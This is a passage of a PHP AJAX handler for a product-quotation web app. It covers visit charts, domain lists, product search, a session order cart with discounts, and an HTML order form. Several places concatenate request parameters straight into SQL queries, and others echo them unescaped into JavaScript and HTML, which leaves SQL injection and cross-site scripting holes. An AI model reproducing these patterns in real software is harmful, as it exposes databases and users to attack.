<?php
require_once ("./config/main_variables.php");
require_once ("./functions/php/sessions.inc.php");
require_once ("./functions/php/knihovna.php");
require_once ("./functions/php/whois.php");



if (isset($_GET["regenerate_user_sess"])){
    session_regenerate_id();
}


if (isset($_GET["sess_language"])){
    echo $_SESSION['language'] = $_GET['sess_language'];
}



if (isset($_GET["counter"])&& isset($_GET["counter_name"])){
    require_once ("./config/mssql_dbconnect.php");
    require_once ('./modules/jpgraph/src/jpgraph.php');
    require_once ('./modules/jpgraph/src/jpgraph_bar.php');
    $fn_where=" WHERE ";
        

        if (isset($_GET["from"])) {$fn_where .= " CAST(visit_date AS DATE) >= '".datedb(@$_GET["from"])."' ";}
        if (isset($_GET["to"]) && $fn_where==" WHERE " ){$fn_where .= " CAST(visit_date AS DATE) <= '".datedb(@$_GET["to"])."' ";}
        else {
            if (isset($_GET["to"])){$fn_where .= " and CAST(visit_date AS DATE) <= '".datedb(@$_GET["to"])."' ";}
        }    
        if (isset($_GET["interval"]) && $fn_where==" WHERE "){
            if (@$_GET["interval"]=="hourly"){$date_format=" CONVERT (varchar,CAST(visit_date as DATE)) + ' ' + CONVERT (varchar,DATEPART(HOUR, visit_date)) ";$fn_where = " GROUP BY CAST(visit_date AS DATE),DATEPART(HOUR,visit_date) ORDER BY CAST(visit_date AS DATE),DATEPART(HOUR,visit_date) ASC ";}
            if (@$_GET["interval"]=="daily"){$date_format=" CAST(visit_date as DATE) ";$fn_where = " GROUP BY CAST(visit_date AS DATE) ORDER BY CAST(visit_date AS DATE) ASC ";}
            if (@$_GET["interval"]=="weekly"){$date_format=" DATEPART(WEEK,visit_date) ";$fn_where = " GROUP BY DATEPART(WEEK,visit_date) ORDER BY DATEPART(WEEK,visit_date) ASC ";}
            if (@$_GET["interval"]=="monthly"){$date_format=" DATEPART(MONTH,visit_date) ";$fn_where = " GROUP BY DATEPART(MONTH,visit_date) ORDER BY DATEPART(MONTH,visit_date) ASC ";}
            if (@$_GET["interval"]=="yearly"){$date_format=" DATEPART(YEAR,visit_date) ";$fn_where = " GROUP BY DATEPART(YEAR,visit_date) ORDER BY DATEPART(YEAR,visit_date) ASC ";}
            
            }
        
            if (isset($_GET["interval"])){
            if (@$_GET["interval"]=="hourly"){$date_format=" CONVERT (varchar,CAST(visit_date as DATE)) + ' ' + CONVERT (varchar,DATEPART(HOUR, visit_date)) ";$fn_where .= " GROUP BY CAST(visit_date AS DATE),DATEPART(HOUR,visit_date) ORDER BY CAST(visit_date AS DATE),DATEPART(HOUR,visit_date) ASC ";}
            if (@$_GET["interval"]=="daily") {$date_format=" CAST(visit_date as DATE) ";$fn_where .= " GROUP BY CAST(visit_date AS DATE) ORDER BY CAST(visit_date AS DATE) ASC ";}
            if (@$_GET["interval"]=="weekly"){$date_format=" DATEPART(WEEK,visit_date) ";$fn_where .= " GROUP BY DATEPART(WEEK,visit_date) ORDER BY DATEPART(WEEK,visit_date) ASC ";}
            if (@$_GET["interval"]=="monthly"){$date_format=" DATEPART(MONTH,visit_date) ";$fn_where .= " GROUP BY DATEPART(MONTH,visit_date) ORDER BY DATEPART(MONTH,visit_date) ASC ";}
            if (@$_GET["interval"]=="yearly"){$date_format=" DATEPART(YEAR,visit_date) ";$fn_where .= " GROUP BY DATEPART(YEAR,visit_date) ORDER BY DATEPART(YEAR,visit_date) ASC ";}
            }            

        @$sql =  "SELECT ".$date_format.",COUNT(id) FROM dbo.[100_customer_visit] ".$fn_where." ";
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
$temp_cykl=0;    
    while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
        $fn_y_label[$temp_cykl] = $row[1];
     if (@$_GET["interval"]=="hourly"){   $fn_x_label[$temp_cykl] = datetimedb_to_datecs($row[0])."\r\n".datetimedb_to_hour($row[0]);}
     else {$fn_x_label[$temp_cykl] = datetimedb_to_datecs($row[0]);}
        $temp_cykl++;
    }   
    

    header("Content-type: image/jpeg");
        $data1y=$fn_y_label;
        $graph = new Graph(500, 400, 'auto');
        $graph->SetScale('textlin');
        $theme_class = new AquaTheme;
        $graph->SetTheme($theme_class);
        // after setting theme, you can change details as you want
        $graph->SetFrame(true, 'lightgray');                        // set frame visible
        $graph->xaxis->SetTickLabels($fn_x_label);
        $graph->title->Set(dictionary($_GET["counter_name"],$_SESSION["language"]));                    // add title

        // add barplot
        $bplot = new BarPlot($data1y);
        $graph->Add($bplot);
        // you can change properties of the plot only after calling Add()
        $bplot->SetWeight(0);
        $bplot->SetFillGradient('#FFAAAA:0.7', '#FFAAAA:1.2', GRAD_VER);
        $bplot->value->Show();    
         //$graph->Stroke();
        print $graph->Stroke();
}






if (isset($_GET["domain_list"])){
    require_once ("./config/mssql_dbconnect.php");
    $get_data="var select = document.getElementById('".$_GET["domain_list"]."');document.getElementById('".$_GET["domain_list"]."').options.length=0;";
        $fn_where=" WHERE ";
        if (isset($_GET["from"])) {$fn_where .= " CAST(visit_date AS DATE) >= '".datedb(@$_GET["from"])."' ";}
        if (isset($_GET["to"]) && $fn_where==" WHERE " ){$fn_where .= " CAST(visit_date AS DATE) <= '".datedb(@$_GET["to"])."' ";}
        else {
            if (isset($_GET["to"])){$fn_where .= " and CAST(visit_date AS DATE) <= '".datedb(@$_GET["to"])."' ";}
        } 
        $fn_where .=" GROUP BY domain ORDER BY domain ";
           
       @$sql =  "SELECT domain FROM dbo.[100_customer_visit] ".$fn_where." ";
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
    while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
             $get_data.="var option = document.createElement(\"option\");option.title = \"".@$row[0]."\";option.value = \"".@$row[0]."\";option.innerHTML = \"".@$row[0]."\";select.appendChild(option);";
        }
    echo $get_data;
}



if (isset($_GET["search_product"])){
require_once ("./config/mssql_dbconnect.php");
       @$sql =  "SELECT prod_index.[product_group],prod_index.[model],prod_index.[sizes],
       prod_group.id, nom_group.id,model.[parent_data_type],(LEFT(model.[data_type], charindex('_', model.[data_type])-1)) as model_type,
       (SELECT (1 + LEN(LEFT(main_model.[systemname], charindex((LEFT(model.[data_type], charindex('_', model.[data_type])-1)), main_model.[systemname])-1)) - LEN(REPLACE(LEFT(main_model.[systemname], charindex(LEFT(model.[data_type], charindex('_', model.[data_type])-1), main_model.[systemname])-1),',',''))) FROM [dbo].[100_main_setting] main_model WHERE main_model.[data_type] = 'MODEL') as radio_position
       FROM dbo.[120_product_search] prod_index,[dbo].[100_product_group] prod_group,
       [dbo].[100_model] model,[dbo].[100_nomenclature_group] nom_group
      WHERE 
      prod_index.[product_group] = prod_group.[data_type]
      AND model.[systemname] = prod_index.[model]
      AND nom_group.[data_type] = model.[parent_data_type]
      AND (prod_index.[karat_catalog_mark] = '".mssecuresql($_GET["search_product"])."'
      OR prod_index.[karat_inernal_no] = '".mssecuresql($_GET["search_product"])."' )
        ";
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
    @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
    //program_log($sql,'DELETE','sql.log');
    if (isset($row[0])){
        
        $Searched_sizes = explode("x", $row[2]);
    echo "
    parent.window_check();
    parent.image_radio_reset(radiocount);
    parent.main_menu_select('main_panel_menu_none');
    parent.check_logon_status('START');
    parent.fn_close_other_menu('x',menucount);
    parent.fn_on_off_display('submenu".@$row[3]."');
    parent.fn_group_image('".@$row[3]."');
    parent.enable_items('submenu_item".@$row[3]."-".@$row[4]."');
    parent.disable_object('submenu_item".@$row[3]."-".@$row[4]."');
    parent.temp_selected_value = ".@$row[4].";
    parent.sel_prod('".$row[1]."'); 
    parent.enable_models('".@$row[5]."','".@$row[6]."');
    parent.enable_sizes('".@$row[6]."','pict_radio".@$row[7]."');
    
    
     sel_height=parent.document.getElementById('height');
     sel_height.options[sel_height.selectedIndex].innerHTML = '".@$Searched_sizes[0]."';
     target_sel_height = '".@$Searched_sizes[0]."';
     
     sel_width=parent.document.getElementById('width');
     sel_width.options[sel_width.selectedIndex].innerHTML = '".@$Searched_sizes[1]."';
     target_sel_width  = '".@$Searched_sizes[1]."';

     sel_depth=parent.document.getElementById('depth');
     sel_depth.options[sel_depth.selectedIndex].innerHTML = '".@$Searched_sizes[2]."';
     target_sel_depth  = '".@$Searched_sizes[2]."';

    parent.load_datalist('100_model','".@$row[6]."');
    
      document.getElementById('program_body').onload= function() {
        parent.fn_check_standard();
    }
    
    
 
    document.getElementById('loading').style.display='none';
    ";}
    else {
       echo "document.getElementById('loading').style.display='none';
    "; 
    }
    //hledani produktu
}


if (isset($_GET["product_working"])){ //product array
$cykl=0;while(@$_SESSION["product"][$cykl]):    


    if (@$_GET["product_working"]=='DEL' && $cykl == @$_GET["item_line_id"]){
       unset($_SESSION["product"][$cykl]);
       //sort(@$_SESSION["product"]);
       foreach (@$_SESSION["product"] as $key => $row) {$arr_key[$key]  = $row[0];}

      array_multisort($arr_key, SORT_NUMERIC, @$_SESSION["product"]);
    }


    if (@$_GET["product_working"]=='AMOUNT' && $cykl == @$_GET["item_line_id"]){
            $temp=explode(" ",@$_SESSION["product"][$cykl][12]);
       for ($temp_cycle=0 ; $temp_cycle<=12; $temp_cycle++){

        switch (@$temp_cycle) {

          case 1: $_SESSION["product"][$cykl][$temp_cycle]=$_GET["amount"];  
                break;
          case 2: $_SESSION["product"][$cykl][$temp_cycle]=CEIL($_GET["amount"]*@$temp[0])." ".$temp[1];       
                break;
          case 3:  if (@$_SESSION["global_discount"]<>0){
                    @$_SESSION["product"][$cykl][$temp_cycle]=ROUND((@$temp[0] - (@$temp[0]*($_SESSION["global_discount"]/100))),2,PHP_ROUND_HALF_EVEN)." ".@$temp[1];}
                    else {@$_SESSION["product"][$cykl][$temp_cycle]="";}
                break;
          case 4:  if (@$_SESSION["global_discount"]<>0){
                    @$_SESSION["product"][$cykl][$temp_cycle]=CEIL((@$_SESSION["product"][$cykl][1]*(@$temp[0] - (@$temp[0]*($_SESSION["global_discount"]/100)))))." ".@$temp[1];}
                    else {@$_SESSION["product"][$cykl][$temp_cycle]="";}
                break;
          default: @$_SESSION["product"][$cykl][$temp_cycle]=@$_SESSION["product"][$cykl][$temp_cycle];
        }
        
       }
        
    }
    
    
    if (@$_GET["product_working"]=='NOTE' && $cykl == @$_GET["item_line_id"]){
         $_SESSION["product"][$cykl][24] = $_GET["note"];
    }

    
    if (@$_GET["product_working"]=='DISCOUNT'){
            $temp=explode(" ",@$_SESSION["product"][$cykl][12]);
                    
       for ($temp_cycle=0 ; $temp_cycle<=12; $temp_cycle++){
        switch ($temp_cycle) {

          case 3:  // diccounted unit price
                if (@$_SESSION["global_discount"]<>0){
                    @$_SESSION["product"][$cykl][$temp_cycle]=ROUND((@$temp[0] - (@$temp[0]*($_SESSION["global_discount"]/100))),2,PHP_ROUND_HALF_EVEN)." ".@$temp[1];}
                    else {@$_SESSION["product"][$cykl][$temp_cycle]="";}
                break;
          case 4: // dicsounted total line price
                if (@$_SESSION["global_discount"]<>0){
                    @$_SESSION["product"][$cykl][$temp_cycle]=CEIL((@$_SESSION["product"][$cykl][1]*(@$temp[0] - (@$temp[0]*($_SESSION["global_discount"]/100)))))." ".@$temp[1];}
                    else {@$_SESSION["product"][$cykl][$temp_cycle]="";}
                break;
          default:
                @$_SESSION["product"][$cykl][$temp_cycle]=@$_SESSION["product"][$cykl][$temp_cycle];
        }
        
       }
    }
        
        
$cykl++;endwhile;


    if (@$_GET["product_working"]=='ADD'){
        $temp=explode(":+:",$_SESSION['product_selecting']);
        @$unit_price = explode(" ", $temp[7]);
        if (isset($_SESSION["product"][($cykl-1)][0])){$count=@$_SESSION["product"][($cykl-1)][0]+1;}
            else {$count=0;}
        $_SESSION["product"][$cykl][0]=$count;
        $_SESSION["product"][$cykl][1]=floatval($_GET["amount"]);
        $_SESSION["product"][$cykl][2]=CEIL($_GET["amount"]*@$unit_price[0])." ".$unit_price[1]; //total line price
        
        if (@$_SESSION["global_discount"]<>0){
            $_SESSION["product"][$cykl][3]=ROUND((@$unit_price[0] - (@$unit_price[0]*($_SESSION["global_discount"]/100))),2,PHP_ROUND_HALF_EVEN)." ".@$unit_price[1];
            $_SESSION["product"][$cykl][4]=CEIL((@$_GET["amount"]*(@$unit_price[0] - (@$unit_price[0]*($_SESSION["global_discount"]/100)))))." ".@$unit_price[1];
        }else {
            $_SESSION["product"][$cykl][3]=""; //discounted unit price
            $_SESSION["product"][$cykl][4]=""; //discounted total line price
        }
            for ($i = 0; isset($temp[$i]); $i++) {
                $_SESSION["product"][$cykl][($i+5)]=$temp[$i];
                
            }
            
            echo "document.getElementById('confirm_amount').value='".dictionary("form_quantity",$_SESSION["language"])."';
            parent.clean_loading_panel();
            ";
        }
        
        
        
        
    if (@$_GET["product_working"]=='ATYPE_ADD'){
        if (isset($_SESSION["product"][($cykl-1)][0])){$count=@$_SESSION["product"][($cykl-1)][0]+1;}
            else {$count=0;}
        $_SESSION["product"][$cykl][0]=$count;
        $_SESSION["product"][$cykl][1]=floatval($_GET["amount"]);
        $_SESSION["product"][$cykl][2]="";
        $_SESSION["product"][$cykl][3]="";
        $_SESSION["product"][$cykl][4]="";
        
        $_SESSION["product"][$cykl][5]="";
        $_SESSION["product"][$cykl][6]="";
        $_SESSION["product"][$cykl][7]=dictionary("atyp_demand_name",$_SESSION["language"]);
        $_SESSION["product"][$cykl][8]="";
        $_SESSION["product"][$cykl][9]=dictionary("pcs",$_SESSION["language"]);
        $_SESSION["product"][$cykl][10]=$_GET["sizes"];
        $_SESSION["product"][$cykl][11]="";
        $_SESSION["product"][$cykl][12]="";

        $temp=explode(":+:",$_SESSION["last_datalist"]);
        $_SESSION["product"][$cykl][13]=$temp[0];
        $_SESSION["product"][$cykl][14]=$temp[1];
        $_SESSION["product"][$cykl][15]=$temp[2];

        $_SESSION["product"][$cykl][16]=$_SESSION["language"];
        $_SESSION["product"][$cykl][17]="CENIK";
        $_SESSION["product"][$cykl][18]=$temp[0];
        $_SESSION["product"][$cykl][19]=$_SESSION['Selected_Product'];
        
        $temp=explode("x",$_GET["sizes"]);
        $_SESSION["product"][$cykl][20]=floatval($temp[0]);
        $_SESSION["product"][$cykl][21]=floatval($temp[1]);
        $_SESSION["product"][$cykl][22]=floatval($temp[2]);
        $_SESSION["product"][$cykl][24]=$_GET["note"];
                
        }
    
        
        
    if (@$_GET["product_working"]=='FULL'){
        echo "window_check();";unset($_SESSION["product"]);
    }
        
        
if (@$_GET["frm_type"]=="FINAL"){echo "parent.finalize_demand('1');";}
        else
    {echo "parent.load_demand('".@$_GET["product_working"]."');";}        
}
















if (isset($_GET["target_list"])){ 

// select correct menu
  require_once ("./config/mssql_dbconnect.php");
        @$temp_sql =" SELECT pr_group.id,nm_group.data_type FROM [dbo].[100_product_group] pr_group,[dbo].[100_nomenclature_group] nm_group WHERE
                 nm_group.parent_data_type = pr_group.data_type 
                 AND '".mssecuresql($_SESSION["product"][$_GET["target_list"]][19])."' like nm_group.data_type+'%' ";
    //program_log($temp_sql,'','sql.log');
    @$temp_check = sqlsrv_query( $conn, $temp_sql , $params, $options );
    @$temp_row = sqlsrv_fetch_array( @$temp_check, SQLSRV_FETCH_BOTH );
    echo "
    parent.enable_models('".$temp_row[1]."');
    parent.fn_close_other_menu('x',menucount);parent.fn_on_display('submenu".$temp_row[0]."');
    parent.enable_items('submenu_item".$temp_row[0]."-".mssecuresql($_SESSION["product"][$_GET["target_list"]][15])."');
    parent.disable_object('submenu_item".$temp_row[0]."-".mssecuresql($_SESSION["product"][$_GET["target_list"]][15])."');
    parent.document.getElementById('submenu_item".$temp_row[0]."-".mssecuresql($_SESSION["product"][$_GET["target_list"]][15])."').className = 'product_in';
";
// end of selected correct menu

$lang_temp=$_SESSION["language"];
$prod_temp=$_SESSION['Selected_Product'];
$_SESSION["language"]=$_SESSION["product"][$_GET["target_list"]][16];
$_SESSION['Selected_Product']=$_SESSION["product"][$_GET["target_list"]][19];

echo "parent.temp_selected_value='".$_SESSION["product"][$_GET["target_list"]][15]."';


parent.load_datalist('".$_SESSION["product"][$_GET["target_list"]][14]."','".$_SESSION["product"][$_GET["target_list"]][13]."');

sel_height='".$_SESSION["product"][$_GET["target_list"]][20]."';
sel_width='".$_SESSION["product"][$_GET["target_list"]][21]."';
sel_depth='".$_SESSION["product"][$_GET["target_list"]][22]."';
target_sel_height='".$_SESSION["product"][$_GET["target_list"]][20]."';
target_sel_width='".$_SESSION["product"][$_GET["target_list"]][21]."';
target_sel_depth='".$_SESSION["product"][$_GET["target_list"]][22]."';
model='".$_SESSION["product"][$_GET["target_list"]][18]."';
";

echo "
parent.document.getElementById('program_body').onload = function(){    
        for (var i=1; i <= radiocount; i++){
            if (parent.document.getElementById('pict_radio'+i).value == '".$_SESSION["product"][$_GET["target_list"]][18]."'){
            parent.enable_sizes('".$_SESSION["product"][$_GET["target_list"]][18]."','pict_radio'+i);
            parent.document.getElementById('pict_radio'+i).src = './images/radio_on.png';
            }
            script = document.createElement('script');
script.src = './ajax_functions.php?std_product='+model+'&height='+sel_height+'&width='+sel_width+'&depth='+sel_depth;
document.getElementsByTagName('head')[0].appendChild(script);

        }
        ";

if ($_SESSION["product"][$_GET["target_list"]][7] == dictionary("atyp_demand_name",$_SESSION["language"])){
    echo "document.getElementById('atypical_sizes').style.display='inline';
                        parent.document.getElementById('atype_amount').value = '".$_SESSION["product"][$_GET["target_list"]][1]."';
                        parent.document.getElementById('atype_depth').value = '".$_SESSION["product"][$_GET["target_list"]][22]."';
                        parent.document.getElementById('atype_width').value = '".$_SESSION["product"][$_GET["target_list"]][21]."';
                        parent.document.getElementById('atype_height').value = '".$_SESSION["product"][$_GET["target_list"]][20]."';
                        parent.document.getElementById('atype_note').value = '".$_SESSION["product"][$_GET["target_list"]][23]."';
                        open_tab('atypical_sizes');
    ";     
}

echo "
};";

    
//$_SESSION["language"]=$lang_temp;
//$_SESSION['Selected_Product']=$prod_temp;    

}










if (isset($_GET["load_demand"])){
    require_once ("./config/mssql_dbconnect.php");
    $temp_language =explode("_",$_SESSION["language"]);$temp_language='ckeditor_'.$temp_language[1];  
    $data.="<div id='request_form' style='font-weight: bold;font-size:18px;font-family: verdana;color:black;' >".dictionary('request_form',@$_SESSION["language"])."</div><p></p>";
    $data.="<table style='width:684px;font-weight: bold;font-size:10px;font-family: verdana;color:black;'>";
    $data.="<form id='demand_form' method='post' enctype='multipart/form-data' >";
    //label

    if (@$_SESSION["global_discount"]<>0){$price_column_description=dictionary("price_after_discount",@$_SESSION["language"]);}
        else {$price_column_description=dictionary("price",@$_SESSION["language"]);
        }
    
    $data.="<tr style='vertical-align:bottom;text-align:center;'>
    <td style='width:30px;'>".dictionary("nr",@$_SESSION["language"])."</td>
    <td colspan=2 style='width:140px;'>".dictionary("catalogue_number",@$_SESSION["language"])."</td>
    <td style='width:140px;'>".dictionary("size",@$_SESSION["language"])."</td>
    <td style='width:54px;' >".dictionary("measurement_unit",@$_SESSION["language"])."</td>
    <td style='width:54px;'>".dictionary("quantity",@$_SESSION["language"])."</td>
    <td style='width:80px;'>".$price_column_description."</td>
    <td style='width:32px;'></td>
    <td style='width:80px;'>".dictionary("total_price",@$_SESSION["language"])."</td>
    <td style='width:40px;'>".dictionary("cancel",@$_SESSION["language"])."</td>
    </tr>";
    
    // end of label
    
    //to reading field cycle
    $total_amount=0;$total_VAT_amount=0;
    $cykl=0;while(@$_SESSION["product"][$cykl]):
    if (@$_SESSION["global_discount"]<>0){$final_line_price=@$_SESSION["product"][$cykl][4];
    $final_unit_price=@$_SESSION["product"][$cykl][3];}
        else {$final_line_price=@$_SESSION["product"][$cykl][2];$final_unit_price=@$_SESSION["product"][$cykl][12];
        }
     
    //dataline
        $data.="<tr style='vertical-align:bottom;' id=1_count_".$cykl." >
        <td style='text-align:center;vertical-align:middle;'><a href=''; onclick='parent.window_change();parent.targeting_selected_unit(\"".$cykl."\");' style='cursor:pointer;' title='".dictionary("open_this_product",$_SESSION["language"])."' >".($cykl+1).".</a></td>
        <td colspan=2 style='text-align:left;'><input readonly=yes id=".$cykl."_demand_value1 name=".$cykl."_demand_value1 value='".@$_SESSION["product"][$cykl][7]."' type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;' ></td>
        <td style='text-align:center;'><input readonly=yes id=".$cykl."_demand_value5 name=".$cykl."_demand_value5 value='".@$_SESSION["product"][$cykl][10]."' type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;' ></td>
        <td style='text-align:center;' ><input readonly=yes id=".$cykl."_demand_value2 name=".$cykl."_demand_value2 value='".@$_SESSION["product"][$cykl][9]."' type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_54_22.png) top left no-repeat;' ></td>
        <td style='text-align:center;'><input onchange=parent.calculate_line_sum('".$cykl."',this.value,''); id=".$cykl."_demand_value3 onclick=select(); name=".$cykl."_demand_value3 value='".@$_SESSION["product"][$cykl][1]."' type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_54_22.png) top left no-repeat;' ></td>
        <td style='text-align:center;'><input readonly=yes id=".$cykl."_demand_value4 name=".$cykl."_demand_value4 value='".$final_unit_price."' type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_80_22.png) top left no-repeat;' ></td>
        <td style='text-align:center;'></td>
        <td style='text-align:center;'><input readonly=yes id=".$cykl."_demand_value6 value='".@$final_line_price."' name=".$cykl."_demand_value6 type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_80_22.png) top left no-repeat;' ></td>
        <td style='text-align:right;'><img id='del_btn_".($cykl+1)."' src='./images/cancel.png' width='23px' height='23px' onmouseout=document.getElementById('del_btn_".($cykl+1)."').src='./images/cancel.png'; onmouseover=document.getElementById('del_btn_".($cykl+1)."').src='./images/delete.png'; style=cursor:pointer; onclick='delete_item_panel(\"".$cykl."\",\"".($cykl+1)." - ".@$_SESSION["product"][$cykl][7]."\",\"\");'  ></td>
        </tr>
        <tr style='vertical-align:bottom;' id=2_count_".$cykl." ><td colspan=2 style='width:95px;text-align:left;vertical-align:middle;'>".dictionary("note",@$_SESSION["language"])."</td>
        <td colspan=8 style='text-align:center;' ><input onchange=parent.note_change('".$cykl."',this.value,''); id=".$cykl."_demand_value7 name=".$cykl."_demand_value7 value='".@$_SESSION["product"][$cykl][24]."' type=text style='width:100%;height:22px;border:0px;text-align:left;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_595_22.png) top left no-repeat;' ></td>
        </tr><tr id=3_count_".$cykl." ><td colspan=10><p style=height:10px;margin:0px;></p></td></tr>";
        //array for control
//        $data.="<tr><td colspan=10 >";
//            for ( $temp_cycle=0 ; isset($_SESSION["product"][$cykl][$temp_cycle]); $temp_cycle++){
//            $data.=@$_SESSION["product"][$cykl][$temp_cycle].":";    
//        }
//        $data.="</td></tr>";
        // end of control array
         
    // end of dataline
        $total_amount=$total_amount+$final_line_price;
        $total_VAT_amount=$total_VAT_amount+$final_line_price;

    $cykl++;endwhile;
        $data.="</form></table>
        <span style='position:absolute;top:10px;left:244px' ><img id=demand_reload src=./images/reload_off.png style=width:22px;height:22px;vertical-align:top;margin-top:1px;cursor:pointer; onmouseout=document.getElementById('demand_reload').src='./images/reload_off.png'; onmouseover=document.getElementById('demand_reload').src='./images/reload_on.png'; onclick=parent.calculate_global_discount(document.getElementById('global_discount').value,''); ><span style=width:9px; ></span><input id=global_discount type=text onchange=parent.calculate_global_discount(this.value,''); onclick=select(); value='";
        if (@$_SESSION["global_discount"]<>0){$data.=@$_SESSION["global_discount"]."%";} else{$data.=dictionary("discount",@$_SESSION["language"]);}
        $data.="' style='color:black;font-weight:normal;font-size:12px;font-family: arial;width:100px;height:22px;padding-top:3px;text-align:center; background: url(./images/quantity.png) no-repeat left top;border:0px;'";
        if (!@$_SESSION["product"][0]){  $data.=" disabled=disabled ";}
         $data.=" > </span>
        <span style='cursor:pointer;position:absolute;top:11px;left:384px;color:white;font-weight:bold;font-size:12px;font-family: verdana;width:150px;height:22px;padding-top:3px;text-align:center; background: url(./images/add_item_button.png) no-repeat left top;border:0px;' onclick='parent.check_demand_step(\"1\");' onmouseout=\"this.style.color='white'\" onmouseover=\"this.style.color='#F2DE41'\"";
        if (!@$_SESSION["product"][0]){  $data.=" disabled=disabled ";}
         $data.=" >".dictionary("finalize_demand",@$_SESSION["language"])."</span>
        <span style='cursor:pointer;position:absolute;top:11px;left:544px;color:white;font-weight:bold;font-size:12px;font-family: verdana;width:150px;height:22px;padding-top:3px;text-align:center; background: url(./images/delete_all.png) no-repeat left top;border:0px;' onclick='delete_item_panel(\"FULL\",\"\");' onmouseout=\"this.style.color='white'\" onmouseover=\"this.style.color='#F2DE41'\"";
        if (!@$_SESSION["product"][0]){  $data.=" disabled=disabled ";}
         $data.=" >".dictionary("delete_all",@$_SESSION["language"])."</span>
         <div style='width:100%;height:10px;' > </div>
         <div style='width:100%;color:black;font-weight:bold;font-size:16px;font-family:verdana;' >
         <hr style='width:100%;' >
         <span style='width:315px;text-align:left;' >".dictionary("total_demand_price",$_SESSION["language"])."</span><span style='width:189px;text-align:center;color:black;font-weight:bold;font-size:12px;font-family:verdana;' >".dictionary("total_demand_price_no_vat",$_SESSION["language"])."</span><span style='width:40px;' > </span><span style='width:140px;text-align:center;color:black;font-weight:bold;font-size:12px;font-family:verdana;' >".dictionary("total_demand_price_vat",$_SESSION["language"])."</span>
         <span style='width:315px;text-align:left;' > </span><span style='width:189px;text-aling:center;' ><input readonly=YES id=total_demand_amount type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_180_22.png) top left no-repeat;' value='".@$total_amount." ".@$_SESSION["Currency_Id"]."' ></span><span style='width:40px;' > </span><span style='width:140px;text-align:center;' ><input readonly=YES id=total_VAT_demand_amount type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;' value='".@$total_VAT_amount." ".@$_SESSION["Currency_Id"]."' ></span>
         </div>
         </script>
        ";    

    if ($_GET["load_demand"]=="DEL" || $_GET["load_demand"]=="DISCOUNT" || $_GET["load_demand"]=="AMOUNT" || $_GET["load_demand"]=="NOTE"){
     echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script>
      <style>
  .fast_window_out{
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:none;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .fast_window_in{
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:#76C1FB;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
  .logout_out{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;  
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .logout_in{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}

 </style></head><body style="width:100%;height:100%;padding:0px;margin:8px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;">'.$data.'</body><script src="./functions/js/data_list.js" type="text/javascript"></script></html>';   
    } else {
     echo '<html style=cursor:pointer; title="'.dictionary("change_window",@$_SESSION["language"]).'" onclick=parent.window_change(); ><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script>
 <style>
  .fast_window_out{
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:none;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
